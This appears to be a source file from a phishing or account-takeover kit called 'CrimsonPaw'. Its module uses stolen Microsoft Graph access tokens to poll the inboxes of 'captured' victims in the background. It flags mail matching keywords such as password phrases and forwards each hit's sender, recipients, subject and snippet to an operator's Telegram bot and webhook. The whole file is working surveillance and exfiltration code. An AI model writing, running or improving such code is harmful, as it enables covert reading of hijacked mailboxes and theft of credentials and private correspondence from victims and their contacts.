# ── keyword_watcher.py ──────────────────────────────────────────────
import re
import json
import time
import html
import logging
import threading
import urllib.request
import urllib.error
from pathlib import Path
from config import Config
import db

logger = logging.getLogger(__name__)

BASE_DIR = Path(__file__).parent.resolve()
SETTINGS_FILE = BASE_DIR / 'settings.json'

# Global reentrant lock prevents background watcher, manual scan_now, and poller from racing
_scan_lock = threading.RLock()

def load_settings():
    if SETTINGS_FILE.exists():
        try:
            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.warning(f"Failed to read settings.json: {e}")
    return {}

def send_keyword_telegram_message(bot_token, chat_id, text, parse_mode='HTML'):
    """Send a message using a specific bot token and chat ID, returning (success, error_message)."""
    if not bot_token or not chat_id:
        return False, "Bot token or Chat ID is missing."
    try:
        payload = json.dumps({
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode,
            'disable_web_page_preview': True
        }).encode('utf-8')
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data=payload,
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=10) as res:
            if res.status == 200:
                return True, "Message delivered successfully."
    except urllib.error.HTTPError as e:
        err_body = ""
        try:
            err_body = e.read().decode('utf-8')
            err_json = json.loads(err_body)
            err_body = err_json.get('description', err_body)
        except Exception:
            pass
        return False, f"Telegram API error ({e.code}): {err_body or e.reason}"
    except Exception as e:
        return False, f"Connection error: {str(e)}"
    return False, "Unknown failure."

def send_alert(tg_html, wh_md=""):
    """Dispatch real-time notification to dedicated Keyword Telegram Bot and Webhook."""
    cfg = load_settings()
    
    # 1. Dedicated Keyword Alerts Telegram Bot
    if cfg.get('kwa_tg_enabled', True):
        kwa_bot_token = cfg.get('kwa_tg_bot_token', '').strip() or cfg.get('tg_bot_token', '').strip()
        kwa_chat_id = cfg.get('kwa_tg_chat_id', '').strip() or cfg.get('tg_chat_id', '').strip()
        if kwa_bot_token and kwa_chat_id:
            ok, msg = send_keyword_telegram_message(kwa_bot_token, kwa_chat_id, tg_html)
            if ok:
                logger.info("✓ Keyword alert Telegram notification sent.")
            else:
                logger.warning(f"Failed to dispatch keyword alert to Telegram: {msg}")
        else:
            logger.info("Keyword alert Telegram notification skipped: Telegram bot token/chat ID not configured.")

    # 2. Webhook Dispatch
    webhook_url = cfg.get('kwa_webhook_url', '').strip() or cfg.get('webhook_url', '').strip()
    if webhook_url:
        try:
            content = wh_md or tg_html
            payload = json.dumps({'content': content, 'text': content}).encode('utf-8')
            req = urllib.request.Request(
                webhook_url,
                data=payload,
                headers={'Content-Type': 'application/json', 'User-Agent': 'Crimson-Paw-Watcher/1.0'}
            )
            urllib.request.urlopen(req, timeout=8)
            logger.info("✓ Keyword alert Webhook notification sent.")
        except Exception as e:
            logger.warning(f"Failed to dispatch keyword alert to Webhook: {e}")

def extract_snippet(text, keyword, context_chars=75):
    """Extract a concise excerpt surrounding the matched keyword with clean ellipses."""
    if not text or not keyword:
        return ""
    pos = text.lower().find(keyword.lower())
    if pos == -1:
        return text[:140] + ("..." if len(text) > 140 else "")
    start = max(0, pos - context_chars)
    end = min(len(text), pos + len(keyword) + context_chars)
    snippet = text[start:end].replace('\r', ' ').replace('\n', ' ').strip()
    if start > 0:
        snippet = "..." + snippet
    if end < len(text):
        snippet = snippet + "..."
    return snippet

def dispatch_keyword_alert(match_data, rule_data):
    """Format Telegram and Webhook keyword alerts using CrimsonPaw keyword alert structure."""
    raw_kw = str(match_data.get('matched_keyword', '')).strip()
    raw_mailbox = str(match_data.get('victim_email') or match_data.get('victim_name') or 'Unknown Mailbox').strip()
    raw_subject = str(match_data.get('email_subject', '(No Subject)')).strip()
    raw_sender = str(match_data.get('email_sender', 'Unknown')).strip()
    raw_to = str(match_data.get('email_to', '—') or '—').strip()
    raw_cc = str(match_data.get('email_cc', '—') or '—').strip()
    raw_bcc = str(match_data.get('email_bcc', '—') or '—').strip()

    # Telegram HTML format
    tg_html = (
        "<b>CrimsonPaw keyword alert</b>\n"
        f"<b>Phrase:</b> {html.escape(raw_kw)}\n"
        f"<b>Mailbox:</b> {html.escape(raw_mailbox)}\n"
        f"<b>Subject:</b> {html.escape(raw_subject)}\n"
        f"<b>From:</b> {html.escape(raw_sender)}\n"
        f"<b>To:</b> {html.escape(raw_to)}\n"
        f"<b>Cc:</b> {html.escape(raw_cc)}\n"
        f"<b>Bcc:</b> {html.escape(raw_bcc)}"
    )

    # Webhook markdown format
    wh_md = (
        "**CrimsonPaw keyword alert**\n"
        f"Phrase: {raw_kw}\n"
        f"Mailbox: {raw_mailbox}\n"
        f"Subject: {raw_subject}\n"
        f"From: {raw_sender}\n"
        f"To: {raw_to}\n"
        f"Cc: {raw_cc}\n"
        f"Bcc: {raw_bcc}"
    )

    send_alert(tg_html, wh_md)

def parse_iso_datetime(dt_str):
    """Normalize ISO-8601 or SQLite datetime string to comparable YYYY-MM-DD HH:MM:SS format."""
    if not dt_str:
        return None
    cleaned = str(dt_str).replace('T', ' ').replace('Z', '').strip()
    if '.' in cleaned:
        cleaned = cleaned.split('.')[0]
    return cleaned

def fetch_graph_messages(access_token, top=50):
    """Fetch recent messages strictly from victim's Inbox folder sorted newest-first.
    Excludes Sent Items, Drafts, and Deleted Items to prevent outgoing campaign duplication.
    """
    url = f"https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?$top={top}&$orderby=receivedDateTime%20desc&$select=id,internetMessageId,subject,from,toRecipients,ccRecipients,bccRecipients,bodyPreview,receivedDateTime,hasAttachments,parentFolderId"
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Accept': 'application/json'
    }
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=12) as res:
            if res.status == 200:
                data = json.loads(res.read().decode('utf-8'))
                return data.get('value', [])
    except urllib.error.HTTPError as e:
        logger.warning(f"Graph API fetch error ({e.code}): {e.reason}")
    except Exception as e:
        logger.warning(f"Graph API connection error: {e}")
    return []

def scan_victim_mailbox(session, rules=None):
    """Scan a single victim's new incoming emails against active keyword rules.
    Thread-safe via _scan_lock. Filters out self-sent emails and deduplicates across folders using internetMessageId.
    """
    with _scan_lock:
        user_code = session.get('user_code')
        victim_name = session.get('victim_name') or 'Unknown'
        victim_email = session.get('victim_email') or 'Unknown'
        v_email_clean = (victim_email or '').strip().lower()
        
        token = db.get_graph_access_token(session)
        if not token:
            logger.info(f"[KEYWORD-WATCHER] Skipping {user_code}: No valid access token available.")
            return {'status': 'error', 'message': 'No valid access token available', 'hits': 0}

        if rules is None:
            rules = db.get_keyword_rules(active_only=True)

        # Filter rules for this account
        applicable_rules = []
        for r in rules:
            target = r.get('target_account', 'all')
            if target in ('all', '', user_code):
                applicable_rules.append(r)

        if not applicable_rules:
            return {'status': 'ok', 'message': 'No applicable rules for account', 'hits': 0}

        messages = fetch_graph_messages(token, top=50)
        if not messages:
            return {'status': 'ok', 'message': 'No messages retrieved', 'hits': 0}

        # Timestamp when account was captured
        capture_time = parse_iso_datetime(session.get('completed_at') or session.get('created_at'))

        new_hits = 0
        detected_matches = []

        for msg in messages:
            msg_id = msg.get('id')
            internet_msg_id = (msg.get('internetMessageId') or '').strip()
            rcvd_time = msg.get('receivedDateTime') or ''
            
            # Enforce boundary: Only evaluate emails received ON OR AFTER victim capture
            msg_time = parse_iso_datetime(rcvd_time)
            if capture_time and msg_time and msg_time < capture_time:
                # Historical email arrived before account was compromised — skip
                continue

            # Deduplication Ledger: Check both Graph message_id and RFC internetMessageId
            if db.is_message_already_matched(user_code, msg_id, internet_message_id=internet_msg_id):
                continue

            sender_obj = msg.get('from', {}).get('emailAddress', {})
            sender_addr = (sender_obj.get('address') or '').strip().lower()
            sender = f"{sender_obj.get('name','')} <{sender_obj.get('address','')}>".strip()

            # Guard: Ignore emails sent by the victim/operator themselves (outbound B2B campaigns / test sends)
            if v_email_clean and sender_addr and sender_addr == v_email_clean:
                continue

            subject = msg.get('subject') or ''
            body_preview = msg.get('bodyPreview') or ''

            def _fmt_recipients(recipients_list):
                if not recipients_list:
                    return "—"
                res = []
                for item in recipients_list:
                    ea = item.get('emailAddress', {}) if isinstance(item, dict) else {}
                    addr = (ea.get('address') or '').strip()
                    name = (ea.get('name') or '').strip()
                    if addr:
                        res.append(f"{name} <{addr}>" if name and name != addr else addr)
                return ", ".join(res) if res else "—"

            to_str = _fmt_recipients(msg.get('toRecipients'))
            cc_str = _fmt_recipients(msg.get('ccRecipients'))
            bcc_str = _fmt_recipients(msg.get('bccRecipients'))

            for r in applicable_rules:
                # Deduplication: If this message was already matched and alerted for this rule, skip immediately
                if db.is_message_already_matched(user_code, msg_id, r['id'], internet_message_id=internet_msg_id):
                    continue

                scope = r.get('search_scope', 'all')
                keywords = r.get('keywords', [])

                # Construct searchable text block based on scope
                search_fields = []
                if scope in ('all', 'subject'):
                    search_fields.append(('subject', subject))
                if scope in ('all', 'body'):
                    search_fields.append(('body', body_preview))
                if scope == 'all':
                    search_fields.append(('sender', sender))

                matched_keywords = []
                matched_field = None
                matched_text = ""

                for kw in keywords:
                    kw_str = str(kw).strip()
                    if not kw_str:
                        continue
                    
                    # Check match across configured fields
                    for field_name, field_val in search_fields:
                        if kw_str.lower() in field_val.lower():
                            if kw_str not in matched_keywords:
                                matched_keywords.append(kw_str)
                            if not matched_field:
                                matched_field = field_name
                                matched_text = field_val
                            break

                if matched_keywords:
                    # Group matched keywords into a clean single string (e.g. "PASSWORD, NEW PASSWORD")
                    primary_kw = matched_keywords[0]
                    kw_display = ", ".join(matched_keywords)
                    snippet = extract_snippet(matched_text if matched_field != 'subject' else f"{subject} — {body_preview}", primary_kw)

                    # ── ATOMIC: Write to ledger FIRST to prevent any concurrent scan from re-alerting ──
                    db.mark_message_alerted(user_code, msg_id, rcvd_time, internet_message_id=internet_msg_id)

                    match_id = db.record_keyword_match(
                        rule_id=r['id'],
                        session_user_code=user_code,
                        victim_name=victim_name,
                        victim_email=victim_email,
                        matched_keyword=kw_display,
                        email_subject=subject,
                        email_sender=sender,
                        email_snippet=snippet,
                        message_id=msg_id,
                        received_datetime=rcvd_time
                    )
                    if match_id:
                        new_hits += 1
                        match_payload = {
                            'id': match_id,
                            'rule_id': r['id'],
                            'session_user_code': user_code,
                            'victim_name': victim_name,
                            'victim_email': victim_email,
                            'matched_keyword': kw_display,
                            'email_subject': subject,
                            'email_sender': sender,
                            'email_to': to_str,
                            'email_cc': cc_str,
                            'email_bcc': bcc_str,
                            'email_snippet': snippet,
                            'message_id': msg_id,
                            'received_datetime': rcvd_time
                        }
                        detected_matches.append(match_payload)
                        # Dispatch Telegram / Webhook strictly ONCE for this email
                        if r.get('notify_telegram') or r.get('notify_webhook'):
                            try:
                                dispatch_keyword_alert(match_payload, r)
                            except Exception as e:
                                logger.warning(f"Error dispatching alert: {e}")
                    
                    # Once this email has triggered an alert for this match, stop evaluating further rules for it
                    break

        logger.info(f"[KEYWORD-WATCHER] Scanned {len(messages)} Inbox emails for {user_code} ({victim_email}): {new_hits} new hits.")
        return {
            'status': 'ok',
            'emails_scanned': len(messages),
            'new_hits': new_hits,
            'matches': detected_matches
        }

def scan_all_victims(rule_ids=None):
    """Scan mailboxes of all CAPTURED sessions across the platform.
    Uses _scan_lock to prevent concurrent scans from the background daemon
    and the manual scan_now API from racing and dispatching duplicate alerts.
    """
    acquired = _scan_lock.acquire(blocking=False)
    if not acquired:
        logger.info("[KEYWORD-WATCHER] Scan already in progress, skipping this cycle.")
        return {'status': 'skipped', 'message': 'Scan already in progress', 'scanned_accounts': 0, 'total_emails_scanned': 0, 'total_new_hits': 0}

    try:
        sessions = db.get_all_sessions()
        captured = [s for s in sessions if s.get('status') == 'CAPTURED']
        
        rules = db.get_keyword_rules(active_only=True)
        if rule_ids:
            rules = [r for r in rules if r['id'] in rule_ids]

        total_scanned_accounts = 0
        total_emails_scanned = 0
        total_new_hits = 0

        for s in captured:
            res = scan_victim_mailbox(s, rules=rules)
            if res.get('status') == 'ok':
                total_scanned_accounts += 1
                total_emails_scanned += res.get('emails_scanned', 0)
                total_new_hits += res.get('new_hits', 0)

        return {
            'status': 'ok',
            'scanned_accounts': total_scanned_accounts,
            'total_emails_scanned': total_emails_scanned,
            'total_new_hits': total_new_hits
        }
    finally:
        _scan_lock.release()

class KeywordWatcherThread(threading.Thread):
    """Continuous background daemon polling victim mailboxes for keyword matches."""
    def __init__(self, interval_seconds=45):
        super().__init__(daemon=True, name="KeywordWatcher")
        self.interval = interval_seconds
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def run(self):
        logger.info(f"Keyword Watcher background daemon started (polling interval: {self.interval}s).")
        # Allow system boot to stabilize before starting first scan
        time.sleep(5)
        while not self._stop_event.is_set():
            try:
                res = scan_all_victims()
                hits = res.get('total_new_hits', 0)
                if hits > 0:
                    logger.info(f"[KEYWORD-WATCHER] Background cycle detected {hits} new intelligence hits.")
            except Exception as e:
                logger.error(f"[KEYWORD-WATCHER] Error in background polling cycle: {e}")
            self._stop_event.wait(self.interval)

